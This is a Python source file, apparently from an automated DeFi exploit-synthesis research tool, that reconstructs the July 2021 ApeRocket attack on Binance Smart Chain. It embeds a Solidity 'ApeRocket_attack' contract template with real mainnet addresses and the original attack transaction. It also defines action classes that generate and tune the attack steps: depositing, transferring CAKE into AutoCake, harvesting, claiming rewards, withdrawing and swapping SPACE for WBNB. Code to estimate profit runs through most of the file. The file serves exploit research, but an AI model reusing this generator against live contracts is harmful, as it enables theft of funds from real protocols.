import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config
from sympy import E

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from Actions.SingleApprox.SingleApprox import single_round_approx, single_round_approx2, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class ApeRocketAction():
    initialStates = [0, 2545, 2473, 22196, 159306]
    globalStates = initialStates.copy()
    # globalStates[0]: AutoCake CakeBalance
    # globalStates[1]: AutoCake Staked
    # globalStates[2]: totalShares
    # globalStates[3]: ApePair WBNB reserve
    # globalStates[4]: ApePair Space reserve

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "./interfaces/ApeRocketI.sol";

// Transaction hash 0x701a308fba23f9b328d2cdb6c7b245f6c3063a510e0d5bc21d2477c9084f93e0
// Timestamp 2021-07-14 04:29:27(UTC)
// Block number 9139708
// From 0x53d07afa123702469ab6cf286e9ff7033a7eff65
// To 0x3523b46a2ccd8b43b2141ab0ccc38f7b013b771c

contract ApeRocket_attack {
    address private BSwapFactoryAddress = 0x858E3312ed3A876947EA49d572A7C42DE08af7EE;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private CAKEAddress = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address private PancakeSwapFactoryAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private SyrupBarAddress = 0x009cF7bC57584b7998236eff51b98A168DceA9B0;
    address private AutoCakeAddress = 0x274B5B7868c848Ac690DC9b4011e9e7e29133700;
    address private SPACEAddress = 0xe486a69E432Fdc29622bF00315f6b34C99b45e80;
    address private ApeFactoryAddress = 0x0841BD0B734E4F5853f0dD8d7Ea041c241fb0Da6;
    address private ApeRouterAddress = 0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607;
    address private ApeSwapFinanceLPAddress = 0xd0F82498051067E154d1dcd3d88fA95063949D7e;

    
    address private MasterChefAddress = 0x73feaa1eE314F8c655E354234017bE2193C9E24E;


    ICAKE CAKE = ICAKE(CAKEAddress);
    IBEP20 SyrupBar = IBEP20(SyrupBarAddress);
    IBEP20 SPACE = IBEP20(SPACEAddress);
    IBEP20 WBNB = IBEP20(WBNBAddress);
    IAutoCake AutoCake =  IAutoCake(AutoCakeAddress);
    IApeRouter ApeRouter = IApeRouter(ApeRouterAddress);
    IMasterChef MasterChef = IMasterChef(MasterChefAddress);
    IApePair ApePair = IApePair(ApeSwapFinanceLPAddress);


    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";


    string str89= "";
    string str90= "";
    string str91= "";
    string str92= "";
    string str93= "";
    string str94= "";

    address[] ad = new address[](2);


    constructor() {
        CAKE.approve(AutoCakeAddress, 2 ** 256 - 1);
        SPACE.approve(ApeRouterAddress, 2 ** 256 - 1);
    }

    receive() external payable {}
    
    '''

    startStr_attack = '''   function attack( $$_$$ ) public {
        // ----------------------------------- Now we have enough CAKE tokens of 1615000 --------------------------------------------------
'''
    
    swap_string = '''        // // ================= start swap ===================================================================================================
        SPACE.approve(address(ApeRouter), 2**256 - 1);
        ad[0] = SPACEAddress;
        ad[1] = CAKEAddress;
        ApeRouter.swapExactTokensForTokens(SPACE.balanceOf(address(this)), 1, ad, address(this), 16263233670);
        
        IPancakeRouter PancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        if(CAKE.balanceOf(address(this)) < 1615000e18){
            uint diff = 1615000e18 - CAKE.balanceOf(address(this));
            WBNB.approve(address(PancakeRouter), 2**256 - 1);
            ad[0] = WBNBAddress;
            ad[1] = CAKEAddress;
            PancakeRouter.swapTokensForExactTokens(diff, WBNB.balanceOf(address(this)), ad, address(this), 16263233670);
        }
    
    '''

    endStr_attack = '''        revert(ProfitSummary());
    }
    '''

    endStr_contract = '''

    function AutoCakeSummary() internal returns (string memory _uintAsString)  {
        uint AutoCakeCakeBalance = CAKE.balanceOf(AutoCakeAddress) / 1e18;
        (uint AutoCakeStaked, ) = MasterChef.userInfo(0, address(AutoCake)) ;
        AutoCakeStaked = AutoCakeStaked / 1e18;
        uint totalShares = AutoCake.totalShares() / 1e18;
        str89 = append("AutoCake CakeBalance: ", uint2str(AutoCakeCakeBalance));
        str90 = append("AutoCake Staked: ", uint2str(AutoCakeStaked));
        str91 = append("totalShares: ", uint2str(totalShares));
        return appendWithSpace(appendWithSpace(str89, str90), str91);
    }

    function ApePairSummary() internal returns (string memory) {
        (uint112 _reserve0, uint112 _reserve1,) = ApePair.getReserves();
        str89 = append("ApePair WBNB reserve: ", uint2str(_reserve0 / 1e18));
        str90 = append("ApePair Space reserve: ", uint2str(_reserve1 / 1e18));
        return appendWithSpace(str89, str90);
    }



    function principleSummary() internal returns (string memory _uintAsString)  {
        uint principle = AutoCake.principalOf(address(this)) / 1e18 ;
        str91 = append("principle: ", uint2str(principle));
        return str91;
    }




    function ProfitSummary() internal returns (string memory _uintAsString)  {
        uint WBNBBalance = WBNB.balanceOf(address(this)) / 1e18;
        uint CAKEBalance =  CAKE.balanceOf(address(this)) / 1e18;
        str1 = append("WBNB Balance: ", uint2str(WBNBBalance));
        str2 = append("CAKE Balance: ", uint2str(CAKEBalance));
        return appendWithSpace(str1, str2);
    }


    function uint2str(uint _i) internal returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    function toString(address account) internal pure returns(string memory) {
        return toString(abi.encodePacked(account));
    }

    function toString(bytes memory data) internal pure returns(string memory) {
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint i = 0; i < data.length; i++) {
            str[2+i*2] = alphabet[uint(uint8(data[i] >> 4))];
            str[3+i*2] = alphabet[uint(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }
}
                
    '''

    initialBalances = {"CAKE": 1615000}
    currentBalances = initialBalances.copy()
    TargetTokens = {'CAKE', 'WBNB'}
    TokenPrices = {"WBNB": 1.0, 'CAKE': 4.587 * 0.01}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        profit = stats[0] + (stats[1] - 1615000) * 4.587 * 0.01
        #        WBNB        CAKE
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = DepositAutoCake # 
        action2 = TransferCAKE
        action3 = HarvestAutoCake 
        action4 = GetRewardAutoCake # 
        action5 = WithdrawAllAutoCake #
        action6 = SwapSpace2WBNB

        action_list_1 = [action1, action4, action5]

        action1_prestate_dependency = [action2, action3, action4, action5]
        action4_prestate_dependency = [action1, action2, action3, action5]
        action5_prestate_dependency = [action1, action2, action3, action4]

        # # # seq of actions
        ActionWrapper = ApeRocketAction
        action_lists = [action1_prestate_dependency + [action1],
                        action4_prestate_dependency + [action4], 
                        action5_prestate_dependency + [action5]]

        start = time.time()
        initialPassCollectData(action_lists, ActionWrapper)
        ShowDataPointsForEachAction(action_list_1)
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    def runinitialPass():
        return




class DepositAutoCake(ApeRocketAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['CAKE']
    tokensOut = ['Share']
    range = [0, 600000]   # 509143

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       AutoCake.deposit($$ * 1e18);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = AutoCakeSummary();

        AutoCake.deposit($$ * 1e18);

        str2 = AutoCakeSummary();
        revert(appendWithSpace(str1, str2));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 6:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # AutoCake CakeBalance
        cls.values[1].append(v1)  # AutoCake Staked
        cls.values[2].append(v2)  # totalShares
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['CAKE'] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2
        return

    @classmethod
    def string(cls):
        return cls.__name__

class TransferCAKE(ApeRocketAction):
    # Action Specific Variables
    numInputs = 1
    tokensIn = ['CAKE']
    tokensOut = []
    range = [0, 1500000]   # 1105857 

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       CAKE.transfer(AutoCakeAddress, $$ * 1e18); \n'''
        return action

    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances['CAKE'] -= input
        cls.globalStates[0] += input

    @classmethod
    def string(cls):
        return cls.__name__

class HarvestAutoCake(ApeRocketAction):
    numInputs = 0
    tokensIn = []
    tokensOut = []
    range = [] 

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        AutoCake.harvest();\n'''
        return action


    @classmethod
    def transit(cls):  # Assume input is a value
        cls.globalStates[1] += cls.globalStates[0]
        cls.globalStates[0] = 0
        return

    @classmethod
    def string(cls):
        return cls.__name__

class GetRewardAutoCake(ApeRocketAction):
    points = []
    values = [[], [], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None
    approximator4 = None

    # Action Specific Variables
    numInputs = 0
    tokensIn = ['Share']
    tokensOut = ['CAKE', 'SPACE']
    range = []  

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       AutoCake.getReward();\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = AutoCakeSummary();
        uint CAKEgot = CAKE.balanceOf(address(this));
        uint SPACEgot = SPACE.balanceOf(address(this));

        AutoCake.getReward();

        CAKEgot = (CAKE.balanceOf(address(this)) - CAKEgot ) / 1e18;
        SPACEgot = (SPACE.balanceOf(address(this)) - SPACEgot ) / 1e18;
        str2 = AutoCakeSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(CAKEgot), uint2str(SPACEgot))));
'''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6], values[7]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 8:
            return -1

        point = [values[0], values[1], values[2]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2, v3, v4 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # AutoCake CakeBalance
        cls.values[1].append(v1)  # AutoCake Staked
        cls.values[2].append(v2)  # totalShares
        cls.values[3].append(v3)  # CAKE got
        cls.values[4].append(v4)  # SPACE got

        return 1


    @classmethod
    def refreshTransitFormula(cls):

        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.approximator4 = NumericalApproximator(cls.points, cls.values[4])                
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls):
        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2]]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        output4 = cls.approximator4(inputs)

        output0 = cls.globalStates[0]
        return output0, output1, output2, output3, output4


    @classmethod
    def transit(cls):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2, output3, output4 = cls.simulate()

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2


        cls.currentBalances['CAKE'] += output3
        
        if 'SPACE' not in cls.currentBalances:
            cls.currentBalances['SPACE'] = output4
        else:
            cls.currentBalances['SPACE'] += output4


    @classmethod
    def string(cls):
        return cls.__name__

class WithdrawAllAutoCake(ApeRocketAction):
    points = []
    values = [[], [], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None
    approximator4 = None

    # Action Specific Variables
    numInputs = 0
    tokensIn = ['Share']
    tokensOut = ['CAKE', 'SPACE']
    range = [] 

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       AutoCake.withdrawAll();\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = AutoCakeSummary();
        uint CAKEgot = CAKE.balanceOf(address(this));
        uint SPACEgot = SPACE.balanceOf(address(this));

        AutoCake.withdrawAll();
        
        CAKEgot = (CAKE.balanceOf(address(this)) - CAKEgot ) / 1e18;
        SPACEgot = (SPACE.balanceOf(address(this)) - SPACEgot ) / 1e18;
        str2 = AutoCakeSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(CAKEgot), uint2str(SPACEgot))));
        
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6], values[7]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 8:
            return -1

        point = [values[0], values[1], values[2]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2, v3, v4 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # AutoCake CakeBalance
        cls.values[1].append(v1)  # AutoCake Staked
        cls.values[2].append(v2)  # totalShares
        cls.values[3].append(v3)  # CAKE got
        cls.values[4].append(v4)  # SPACE got
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 =  NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 =  NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 =  NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 =  NumericalApproximator(cls.points, cls.values[3])
        cls.approximator4 =  NumericalApproximator(cls.points, cls.values[4])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls):
        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2]]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        output4 = cls.approximator4(inputs)
        return output0, output1, output2, output3, output4



    @classmethod
    def transit(cls):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2, output3, output4 = cls.simulate()

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2


        cls.currentBalances['CAKE'] += output3

        if "SPACE" not in cls.currentBalances:
            cls.currentBalances['SPACE'] = output4
        else:
            cls.currentBalances['SPACE'] += output4


        return

    @classmethod
    def string(cls):
        return cls.__name__

class SwapSpace2WBNB(ApeRocketAction):
    numInputs = 1
    tokensIn = ['SPACE']
    tokensOut = ['WBNB']
    range = [0, 800000] # 503997

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        ad[0] = SPACEAddress;
        ad[1] = WBNBAddress;
        ApeRouter.swapExactTokensForTokens($$ * 1e18, 1, ad, address(this), 16263233670);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        newSPACELiquidity = cls.globalStates[4] + input  # SPACE
        WBNBOut = 997 * input * cls.globalStates[3] / (1000 * cls.globalStates[4]  + 997 * input)
        newWBNBLiquidity =  cls.globalStates[3] - WBNBOut
        return newWBNBLiquidity, newSPACELiquidity, WBNBOut

    @classmethod
    def transit(cls, input):  # Assume input is a value
        newWBNBLiquidity, newSPACELiquidity, WBNBOut = cls.simulate(input)
        cls.globalStates[3] = newWBNBLiquidity
        cls.globalStates[4] = newSPACELiquidity
        if "WBNB" not in cls.currentBalances.keys():
            cls.currentBalances["WBNB"] = WBNBOut
        else:
            cls.currentBalances["WBNB"] += WBNBOut

    @classmethod
    def string(cls):
        return cls.__name__


class SwapWBNB2Space(ApeRocketAction):
    numInputs = 1
    tokensIn = ['SPACE']
    tokensOut = ['WBNB']
    range = [0, 20000] # 16857(based on WBNB out)
    
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        ad[0] = WBNBAddress;
        ad[1] = SPACEAddress;
        ApeRouter.swapExactTokensForTokens($$ * 1e18, 1, ad, address(this), 16263233670);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        newWBNBLiquidity = cls.globalStates[3] + input  # WBNB
        SPACEOut = 997 * input * cls.globalStates[4] / (1000 * cls.globalStates[3]  + 997 * input)
        newSPACELiquidity = cls.globalStates[4] - SPACEOut
        return newWBNBLiquidity, newSPACELiquidity, SPACEOut

    @classmethod
    def transit(cls, input):  # Assume input is a value
        newWBNBLiquidity, newSPACELiquidity, SPACEOut = cls.simulate(input)
        cls.globalStates[3] = newWBNBLiquidity
        cls.globalStates[4] = newSPACELiquidity
        if "SPACE" not in cls.currentBalances.keys():
            cls.currentBalances["SPACE"] = SPACEOut
        else:
            cls.currentBalances["SPACE"] += SPACEOut

    @classmethod
    def string(cls):
        return cls.__name__



def main():
    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 1
    config.initialEther = 0
    config.blockNum = 9139708
    config.contract_name = "ApeRocket_attack"


# Test for initial pass of data collecton:
    ApeRocketAction.initialPass()
    # ApeRocketAction.runinitialPass()

    # action1 = DepositAutoCake
    # action2 = TransferCAKE
    # action3 = HarvestAutoCake
    # action4 = GetRewardAutoCake
    # action5 = WithdrawAllAutoCake
    # action6 = SwapSpace2WBNB

    # action_list = [action1, action2, action3, action4, action5, action6]
    # initial_guess = [509143, 1105857, 503997]
    # ActionWrapper = ApeRocketAction

    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list)) # 56924.128741149354
    # # actual_profit = 1345.8301500000016
    # # print("actual profit: ", actual_profit)
    # # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # # return actual_profit, e1, e2, e3, e4





if __name__ == '__main__':
    main()
    